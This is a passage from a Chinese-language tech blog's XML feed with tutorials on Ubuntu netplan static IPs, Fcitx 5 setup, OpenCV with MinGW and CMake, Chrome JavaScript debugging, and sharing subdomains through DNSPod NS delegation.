    <content><![CDATA[<p>登录到你的 Ubuntu 服务器 22.04，查找 <code>netplan</code> 配置文件。它位于 <code>/etc/netplan</code> 目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> cd /etc/netplan/</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l</span></span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 116 Oct 12 04:03 00-installer-config.yaml</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure>

<p>运行以下 cat 命令以查看 <code>00-installer-config.yaml</code> 的内容。<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8-Ubuntu-%E6%9C%8D%E5%8A%A1%E5%99%A8-22-04-%E4%B8%8A%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81-IP-%E5%9C%B0%E5%9D%80-2024-11-08-18-40-40.png" alt="在-Ubuntu-服务器-22-04-上设置静态-IP-地址-2024-11-08-18-40-40"></p>
<p>根据上面的输出，它说我们有 <code>ens33</code> 接口，它正在从 <code>DHCP</code> 服务器获取 IP。查看接口名称的另一种方法是通过 ip 命令。<br>现在，要配置静态 IP 代替 DHCP，使用 <code>vi</code> 或 <code>nano</code> 编辑器编辑 netplan 配置文件并添加以下内容。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">sudo</span> <span class="string">vi</span> <span class="number">00</span><span class="string">-installer-config.yaml</span></span><br><span class="line"><span class="comment"># This is the network config written by &#x27;subiquity&#x27;</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">ens33:</span></span><br><span class="line">      <span class="attr">addresses:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.247</span><span class="string">/24</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">4.2</span><span class="number">.2</span><span class="number">.2</span>, <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>]</span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">default</span></span><br><span class="line">          <span class="attr">via:</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>保存并关闭文件。<br>要是上述修改生效，请使用以下 netplan 命令应用这些更改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>

<p>完美，以上命令的输出确认静态 IP 和路由配置成功。</p>
]]></content>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ubuntu 安装配置 Fcitx 5 中文输入法</title>
    <url>/posts/3fc249cf/</url>
    <content><![CDATA[<h3 id="检查系统中文环境"><a href="#检查系统中文环境" class="headerlink" title="检查系统中文环境"></a><strong>检查系统中文环境</strong></h3><p>在 Ubuntu 设置中打开「区域与语言」—— 「管理已安装的语言」，然后会自动检查已安装语言是否完整。若不完整，根据提示安装即可。</p>
<h3 id="最小安装"><a href="#最小安装" class="headerlink" title="最小安装"></a><strong>最小安装</strong></h3><p>为使用 Fcitx 5，需要安装三部分基本内容：</p>
<ol>
<li>Fcitx 5 主程序</li>
<li>中文输入法引擎</li>
<li>图形界面相关</li>
</ol>
<p>按照这个思路，可以直接使用 <code>apt</code> 进行安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install fcitx5 \</span><br><span class="line">fcitx5-chinese-addons \</span><br><span class="line">fcitx5-frontend-gtk4 fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 \</span><br><span class="line">fcitx5-frontend-qt5</span><br></pre></td></tr></table></figure>

<h3 id="安装中文词库"><a href="#安装中文词库" class="headerlink" title="安装中文词库"></a><strong>安装中文词库</strong></h3><p>在 GitHub 打开<a href="https://github.com/felixonmars/fcitx5-pinyin-zhwiki">维基百科中文拼音词库</a>的 <a href="https://github.com/felixonmars/fcitx5-pinyin-zhwiki/releases">Releases</a> 界面，下载最新版的 <code>.dict</code> 文件。按照 README 的指导，将其复制到 <code>~/.local/share/fcitx5/pinyin/dictionaries/</code> 文件夹下即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载词库文件</span></span><br><span class="line">wget https://github.com/felixonmars/fcitx5-pinyin-zhwiki/releases/download/0.2.4/zhwiki-20220416.dict</span><br><span class="line"><span class="comment"># 创建存储目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.local/share/fcitx5/pinyin/dictionaries/</span><br><span class="line"><span class="comment"># 移动词库文件至该目录</span></span><br><span class="line"><span class="built_in">mv</span> zhwiki-20220416.dict ~/.local/share/fcitx5/pinyin/dictionaries/**SHELL**</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a><strong>配置</strong></h2><h3 id="设置为默认输入法"><a href="#设置为默认输入法" class="headerlink" title="设置为默认输入法"></a><strong>设置为默认输入法</strong></h3><p>使用 im-config 工具可以配置首选输入法，在任意命令行输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure>

<p>根据弹出窗口的提示，将首选输入法设置为 Fcitx 5 即可。</p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a><strong>环境变量</strong></h3><p>需要为桌面会话设置环境变量，即将以下配置项写入某一配置文件中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=fcitx</span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx</span><br></pre></td></tr></table></figure>

<p>如果使用 Bash 作为 shell，则建议写入至 <code>~/.bash_profile</code>，这样只对当前用户生效，而不影响其他用户。</p>
<ul>
<li>引用自<a href="https://muzing.top/posts/3fc249cf/">https://muzing.top/posts/3fc249cf/</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows下为mingw配置opencv</title>
    <url>/posts/29c2a35d/</url>
    <content><![CDATA[<h1 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h1><h2 id="安装dev-c-或者小熊猫c"><a href="#安装dev-c-或者小熊猫c" class="headerlink" title="安装dev c++或者小熊猫c++"></a>安装dev c++或者小熊猫c++</h2><blockquote>
<p>这里推荐使用小熊猫c++,他就是dev c++的pro max版本，在保持样式基本相同的同时，有很多代码高亮，提示等功能。<a href="https://alist.zfxt.top/d/%E5%85%B1%E4%BA%AB/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/%E5%B0%8F%E7%86%8A%E7%8C%AB/%E5%B0%8F%E7%86%8A%E7%8C%ABC%20%20.2.26.win64.MinGW-w64%20X86_64%20GCC%2011.4.Setup.exe?sign=Q7-9X194GKmb3sCVFZ56qI768TsnJmPlVrhOtrny9RE=:0">下载链接</a></p>
</blockquote>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-57-04.png" alt="在windows下为mingw配置opencv-2024-12-14-11-57-04"><br>这是官网链接:<a href="http://royqh.net/redpandacpp/">http://royqh.net/redpandacpp/</a><br>安装过程一路默认，只需要修改你所安装的位置即可。</p>
<h2 id="下载已经编译好的opencv"><a href="#下载已经编译好的opencv" class="headerlink" title="下载已经编译好的opencv"></a>下载已经编译好的opencv</h2><p><a href="https://github.com/huihut/OpenCV-MinGW-Build/releases">github realese链接</a><br>注意，下载时需要和你电脑本地的mingw版本号为位数相对应才可以正常使用。</p>
<p>下载后，将其解压在某个具体的路径，如下：<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-38-29.png" alt="在windows下为mingw配置opencv-2024-12-14-11-38-29"></p>
<h2 id="配置编译器"><a href="#配置编译器" class="headerlink" title="配置编译器"></a>配置编译器</h2><p>点击<code>工具</code>-&gt;<code>选项</code>-&gt;<code>编译器</code><br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-47-28.png" alt="在windows下为mingw配置opencv-2024-12-14-11-47-28"><br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-47-03.png" alt="在windows下为mingw配置opencv-2024-12-14-11-47-03"></p>
<p>接下来，分别添加bin文件，lib文件目录和include目录<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-48-43.png" alt="在windows下为mingw配置opencv-2024-12-14-11-48-43"><br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-48-58.png" alt="在windows下为mingw配置opencv-2024-12-14-11-48-58"><br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-49-14.png" alt="在windows下为mingw配置opencv-2024-12-14-11-49-14"></p>
<p>注意，选择的目录为你所解压的opencv文件所在的目录。</p>
<p>最后，在链接时添加如下选项，即完成opencv的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-lopencv_core455 -lopencv_imgproc455 -lopencv_highgui455 -lopencv_imgcodecs455 -lopencv_videoio455 -lopencv_calib3d455 -lopencv_features2d455 -lopencv_objdetect455 -lopencv_flann455 -lopencv_ml455 -lopencv_photo455 -lopencv_stitching455 -lopencv_video455 -lopencv_dnn455 -lopencv_gapi455</span><br></pre></td></tr></table></figure>

<p><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-11-50-26.png" alt="在windows下为mingw配置opencv-2024-12-14-11-50-26"></p>
<p>到这为止。你就可以快乐的使用OpenCV去完成开发内容了（下面的内容可以忽略）</p>
<h1 id="VSCode-CMake下的配置"><a href="#VSCode-CMake下的配置" class="headerlink" title="VSCode+CMake下的配置"></a>VSCode+CMake下的配置</h1><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><p>可以看到，在上面的配置中，我们只能使用<code>dev c++</code>和<code>小熊猫c++</code>，而且链接时需要写一大串内容。如果在更换工作环境时or帮助别人配置环境时，总是要有这么一大串要静态链接的内容。就感到颇为麻烦。</p>
<p>所以思考能不能优化链接的方式，通过通配符直接完成所有静态库的引用和链接。于是选择了使用<code>CMake+VSCode</code>的方式来完成配置(你用CLion也是可以的)</p>
<p>关于静态库和动态库的区分：</p>
<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
    <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=1805063570&bvid=BV1fb421q7gc&cid=1564793505&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
</div>

<p>然后，不难发现；在opencv的bin目录下都是已经经过编译的动态库文件(以<code>.dll</code>结尾)<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-20-19.png" alt="在windows下为mingw配置opencv-2024-12-14-12-20-19"></p>
<p>而在lib文件中，则是与这些动态库文件相对应的静态库文件(以<code>.dll.a</code>结尾)：<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-21-27.png" alt="在windows下为mingw配置opencv-2024-12-14-12-21-27"></p>
<p>关于为什么会是这样子的一个形式，可以查看<code>MingW</code>编译时为动态库时的选项，这里仅提供一个参考的链接<a href="https://blog.csdn.net/imsaws/article/details/15341347">MingW下动态链接库常识</a></p>
<blockquote>
<p>大抵就是说这些静态库文件并不具备具体的函数实现。他的作用只是对动态库的一个声明，方便程序在运行时自动寻找到动态库。(个人看法，不一定正确)(这样子的情况在MSVC编译器下也存在，只是表达方式不一样而已)</p>
</blockquote>
<p>所以我们可以明确我们要配置opencv就是要：<br><strong>在编译的时候，添加上include头文件和静态库文件。在运行时让他可以找到动态库文件</strong></p>
<h2 id="编译部分"><a href="#编译部分" class="headerlink" title="编译部分"></a>编译部分</h2><p>文件目录如下：<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-31-36.png" alt="在windows下为mingw配置opencv-2024-12-14-12-31-36"><br>此时我们使用<code>CMake</code>（默认你们已经下载好VSCode和CMake插件等）<br><code>CMakeLists.txt</code>的内容如下:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.10)</span><br><span class="line">project(CV)</span><br><span class="line">add_executable(Test main.cpp)</span><br><span class="line"></span><br><span class="line"># 将OpenCV的静态库以别名的形式存储</span><br><span class="line">file(GLOB OPENCV_LIBS &quot;D:/Program Files/OpenCV/OpenCV-MinGW-Build-OpenCV-4.5.5-x64/x64/mingw/lib/libopencv_*.dll.a&quot;)</span><br><span class="line"></span><br><span class="line">include_directories(&quot;D:/Program Files/OpenCV/OpenCV-MinGW-Build-OpenCV-4.5.5-x64/include&quot;)</span><br><span class="line"></span><br><span class="line">target_link_libraries(Test $&#123;OPENCV_LIBS&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cmake_minimum_required</code> 此命令指定了构建项目所需的最低CMake版本</li>
<li><code>project</code> 该命令定义了项目的名称，这里项目命名为CV</li>
<li><code>add_executable(Test main.cpp)</code> 此命令将创建一个名为Test的可执行文件，并将main.cpp作为源文件进行编译。</li>
<li><code>file(GLOB YOU_FILE_LIST_NAME DIRECTION)</code> file()命令用于创建一个包含所有符合指定路径模式的文件的列表。可以使用通配符</li>
<li><code>include_directories()</code> 此命令指定了包含目录，即Include的目录</li>
<li><code>target_link_libraries(Test $&#123;OPENCV_LIBS&#125;)</code> 此命令将前面获取到的OpenCV静态库链接到目标Test。OPENCV_LIBS变量包含了所有需要链接的库文件，CMake会将它们与Test目标进行链接</li>
</ul>
<p>当你<code>ctrl+s</code>保存后，CMake会自动帮你配置。你只需要点击屏幕下的<code>build</code>按钮<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-44-01.png" alt="在windows下为mingw配置opencv-2024-12-14-12-44-01"></p>
<p>然后你就可以看到build目录下有一个<code>Text.exe</code>文件，即完成了编译工作了。<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-46-15.png" alt="在windows下为mingw配置opencv-2024-12-14-12-46-15"></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>此时，我们点击该文件运行，却发现仍然有错误：显示缺少动态运行库</p>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-47-00.png" alt="在windows下为mingw配置opencv-2024-12-14-12-47-00"></p>
<p>对，这很合理，因为你只为它链接了动态库的<code>imp-lib</code>，他会去寻找动态库在哪。但是因为你没有为他配置动态库，所以他找不到。于是再次报错。</p>
<p>这里提供几个解决方法：</p>
<ol>
<li><p>把<code>bin</code>目录下所有的<code>dll</code>文件复制到EXE文件目录，或者把EXE文件放到<code>OpenCV</code>的<code>bin</code>目录下，就可以直接运行。(这个方法有点笨，但最简单有效,而且不会污染开发环境)</p>
</li>
<li><p>把<code>OpenCV</code>的bin目录放到<code>PATH</code>下。如图：<br> <img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-52-10.png" alt="在windows下为mingw配置opencv-2024-12-14-12-52-10"><br> 这种方法也简单，但是考虑到我并不会长期使用OpenCV，可能只是应付上课or什么的。所以我也不想污染我的环境。所以还有最后一个方法</p>
</li>
<li><p>使用<code>VSCode</code>的launch调试工具<br> <img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-12-54-08.png" alt="在windows下为mingw配置opencv-2024-12-14-12-54-08"></p>
<p> 他需要你创建一个<code>launch.json</code>用于启动你运行的程序<br> 具体内容如下：</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug with MinGW GDB&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:/Program Files/OpenCV/OpenCV-MinGW-Build-OpenCV-4.5.5-x64/x64/mingw/bin;$&#123;env:PATH&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:/Program Files/RedPanda-Cpp/MinGW64/bin/gdb.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">       </span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p> 在上述代码中：</p>
<ul>
<li><code>program</code> 这个字段指定了要调试的可执行文件路径</li>
<li><code>cwd</code> 这是程序的当前工作目录,即你的程序跑起来是的根目录，如果你有通过相对路径读取文件的话，比如我读取的<code>lena.jpg</code>他就应该在这个目录下，他通常就是你的cpp所在的目录。</li>
<li><code>environment</code> 该字段定义了调试会话的环境变量，这里就是最重点的部分，你在这里添加上OpenCV的bin目录的路径，然后就他就可以在调试中启动。既不污染电脑的环境，也达到了跑程序的目的</li>
<li><code>externalConsole</code> 这个字段设置为 true，表示调试时会启动一个外部终端窗口。<em>方便截图提交作业( •̀ ω •́ )y</em></li>
<li><code>miDebuggerPath</code> 该字段指定了 GDB 调试器的路径，就是你的<code>MinGW</code>的bin目录下的gdb程序</li>
</ul>
<p> 上述是我认为稍微重点的部分，其他更多的参数配置请查询官网。</p>
</li>
</ol>
<p>至此。再点击<code>launch</code>运行该程序，同时你还可以给你的程序打断点进行调试。<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8windows%E4%B8%8B%E4%B8%BAmingw%E9%85%8D%E7%BD%AEopencv-2024-12-14-13-02-20.png" alt="在windows下为mingw配置opencv-2024-12-14-13-02-20"></p>
<p>于是，所有的配置部分都圆满结束。</p>
]]></content>
      <tags>
        <tag>opencv</tag>
        <tag>mingw</tag>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>在浏览器调试js程序</title>
    <url>/posts/af74895e/</url>
    <content><![CDATA[<h2 id="在浏览器中调试"><a href="#在浏览器中调试" class="headerlink" title="在浏览器中调试"></a>在浏览器中调试</h2><p>在编写更复杂的代码前，让我们先来聊聊调试吧。</p>
<p><strong>调试</strong> 是指在一个脚本中找出并修复错误的过程。所有的现代浏览器和大多数其他环境都支持调试工具 —— 开发者工具中的一个令调试更加容易的特殊用户界面。它也可以让我们一步步地跟踪代码以查看当前实际运行情况。</p>
<p>在这里我们将会使用 Chrome（谷歌浏览器），因为它拥有足够多的功能，其他大部分浏览器的功能也与之类似。</p>
<h3 id="“资源（Sources）”面板"><a href="#“资源（Sources）”面板" class="headerlink" title="“资源（Sources）”面板"></a>“资源（Sources）”面板</h3><p>你的 Chrome 版本可能看起来有一点不同，但是它应该还是处于很明显的位置。</p>
<ul>
<li>在 Chrome 中打开 示例页面。</li>
<li>使用快捷键 <code>F12</code>（Mac：Cmd+Opt+I）打开开发者工具。</li>
<li>选择 Sources（资源） 面板。<br>如果你是第一次这么做，那你应该会看到下面这个样子：<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95js%E7%A8%8B%E5%BA%8F-2024-07-02-12-43-29.png" alt="在浏览器调试js程序-2024-07-02-12-43-29"></li>
</ul>
<p>切换按钮  会打开文件列表的选项卡。</p>
<p>让我们在预览树中点击和选择 hello.js。这里应该会如下图所示：<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95js%E7%A8%8B%E5%BA%8F-2024-07-02-12-44-00.png" alt="在浏览器调试js程序-2024-07-02-12-44-00"></p>
<p>资源（Sources）面板包含三个部分：</p>
<ol>
<li><strong>文件导航（File Navigator）</strong> 区域列出了 HTML、JavaScript、CSS 和包括图片在内的其他依附于此页面的文件。Chrome 扩展程序也会显示在这。</li>
<li><strong>代码编辑（Code Editor）</strong> 区域展示源码。</li>
<li><strong>JavaScript 调试（JavaScript Debugging）</strong> 区域是用于调试的，我们很快就会来探索它。<br>现在你可以再次点击切换按钮  隐藏资源列表来给代码腾出一些空间。</li>
</ol>
<h3 id="控制台（Console）"><a href="#控制台（Console）" class="headerlink" title="控制台（Console）"></a>控制台（Console）</h3><p>如果我们按下 Esc，下面会出现一个控制台，我们可以输入一些命令然后按下 Enter 来执行。</p>
<p>语句执行完毕之后，其执行结果会显示在下面。</p>
<p>例如，1+2 将会返回 3，而 hello(“debugger”) 函数调用什么也没返回，所以结果是 undefined：<br><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95js%E7%A8%8B%E5%BA%8F-2024-07-02-12-45-06.png" alt="在浏览器调试js程序-2024-07-02-12-45-06"></p>
<h3 id="断点（Breakpoints）"><a href="#断点（Breakpoints）" class="headerlink" title="断点（Breakpoints）"></a>断点（Breakpoints）</h3><p>我们来看看 示例页面 发生了什么。在 hello.js 中，点击第 4 行。是的，就点击数字 “4” 上，不是点击代码。</p>
<p>恭喜你！你已经设置了一个断点。现在，请在第 8 行的数字上也点击一下。</p>
<p>看起来应该是这样的（蓝色是你应该点击的地方）：</p>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95js%E7%A8%8B%E5%BA%8F-2024-07-02-12-45-26.png" alt="在浏览器调试js程序-2024-07-02-12-45-26"><br><strong>断点</strong> 是调试器会自动暂停 JavaScript 执行的地方。</p>
<p>当代码被暂停时，我们可以检查当前的变量，在控制台执行命令等等。换句话说，我们可以调试它。</p>
<p>我们总是可以在右侧的面板中找到断点的列表。当我们在数个文件中有许多断点时，这是非常有用的。它允许我们：</p>
<p>快速跳转至代码中的断点（通过点击右侧面板中的对应的断点）。<br>通过取消选中断点来临时禁用对应的断点。<br>通过右键单击并选择移除来删除一个断点。<br>……等等。</p>
<h2 id="oklink爬取"><a href="#oklink爬取" class="headerlink" title="oklink爬取"></a>oklink爬取</h2><p><a href="https://blog.51cto.com/char1es/9147284">大佬心得</a><br>这里我就不再赘述了，直接看大佬的文章叭。<br>毕竟这些东西，并不具有可重复性。大概懂思路，其他的网站的情况又会大不相同。需要另外分析。</p>
]]></content>
      <tags>
        <tag>js</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>子域名共享使用</title>
    <url>/posts/8fd4bcc4/</url>
    <content><![CDATA[<blockquote>
<p>记录最近想到的一个小知识点</p>
</blockquote>
<h2 id="问题起源"><a href="#问题起源" class="headerlink" title="问题起源"></a>问题起源</h2><p>在最开始我还没有购买自己的域名时，我大多时候想着白嫖，于是就逛了很多包括MyDomain，eu.org此类的网站。同时也在一些学习的qq群里看到有人共享二级域名给别人免费使用。这么一想，我突然发现。似乎是个可以免费提供出去的服务（适用场景：在一个小团队里，大家并不需要每个人都购买一个域名，而是统一的在一个<code>team.com</code>的一级域名下，在将每个二级域名例如：<code>名字缩写+team.com</code>这样式的。分配给每一个人，这样每个人都会有一个自己可以完全支配的域名）。</p>
<p>这个功能在github，jetbrain Space中，语雀语雀里有些不一样的。但是他们都是根据你的用户名生成一个唯一的字符串，然后把这个字符串与他们自己的域名拼接起来。然后CNAME到一个具体的个人主页。这样就算是有一个属于你自己的个人主页和唯一的地址。</p>
<p>而我所表达的是，你拥有一个完全可以分离出去的二级域名，你可以把这个二级域名再做单独的解析。</p>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>这里我以<code>DNSPod</code>举例，他是一个国产的DNS解析服务商，他的免费版就可以实现这个功能。</p>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%85%B1%E4%BA%AB%E4%BD%BF%E7%94%A8-2024-06-16-14-21-55.png" alt="子域名共享使用-2024-06-16-14-21-55"></p>
<ol>
<li>首先我们点击添加域名，然后输入我们的二级域名，这里我输入<code>test</code>，然后填写我们的目标地址，这里我填写<code>test.zfxt.top</code>，然后点击确定。<br> <img src="https://image.zfxt.top/hexo-blog/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%85%B1%E4%BA%AB%E4%BD%BF%E7%94%A8-2024-06-16-14-23-57.png" alt="子域名共享使用-2024-06-16-14-23-57"></li>
<li>然后我们就可以看到我们的二级域名已经添加成功了。<br> 此时并没有完成功能，这里会有个问题需要我们在主域名的解析里添加两个NS解析记录，这两个解析记录是DNSPod给我们的，我们需要把这两个解析记录添加到我们的主域名解析里。<br> <img src="https://image.zfxt.top/hexo-blog/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%85%B1%E4%BA%AB%E4%BD%BF%E7%94%A8-2024-06-16-14-24-44.png" alt="子域名共享使用-2024-06-16-14-24-44"></li>
<li>添加完这两个解析记录后，我们就可以看到我们的二级域名已经可以正常解析了。<br> <img src="https://image.zfxt.top/hexo-blog/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%85%B1%E4%BA%AB%E4%BD%BF%E7%94%A8-2024-06-16-14-26-11.png" alt="子域名共享使用-2024-06-16-14-26-11"></li>
<li>最后点击开始解析，你就实现了一个二级域名的共享使用了。<br> <img src="https://image.zfxt.top/hexo-blog/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%85%B1%E4%BA%AB%E4%BD%BF%E7%94%A8-2024-06-16-14-27-10.png" alt="子域名共享使用-2024-06-16-14-27-10"></li>
</ol>
<p>以上，使用这个功能，你可以把你的二级域名共享给别人使用，别人就可以白嫖你的域名了。哈哈哈</p>
<blockquote>
<p>不过要注意的是，一个可以单独解析的二级域名可以做很多的事，但也有一些DNS服务商（如cloudflare）就不支持解析二级域名（免费版不支持）。</p>
</blockquote>
]]></content>
      <tags>
        <tag>DNS解析</tag>
        <tag>子域名</tag>
      </tags>
  </entry>
  <entry>
